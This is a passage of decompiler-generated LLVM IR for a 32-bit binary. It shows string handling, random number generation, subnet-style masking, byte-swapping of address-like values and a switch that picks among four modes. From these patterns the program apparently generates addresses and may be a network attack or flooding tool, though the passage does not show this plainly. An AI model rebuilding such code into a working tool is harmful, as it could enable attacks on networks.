  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be216, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8215, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be216, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_80514e0(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_8050be0(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_8050be0(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_8050be0(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_8050be0(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_8050be0(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_8050be0(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_8050be0(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_8050be0(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_8050be0(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_8050be0(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_8050be0(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8052b88(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp137 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp137, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d6 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d6, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d6 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8051500(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_80514e0(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_8051fe3(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8051500(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8051500(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8051500(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp239, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v0_8048463 = call i32 @function_804f020()
  store i32 %v0_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp243 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp243, 0
  br i1 %v4_8048478, label %bb138, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp243 to i32
  %v5_8048478 = lshr i32 %v0_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v0_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb138
  %v0_804848a = call i32 @function_804f020()
  %v1_804848a = sext i32 %v0_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v0_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v1_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_8051d42(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp139, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
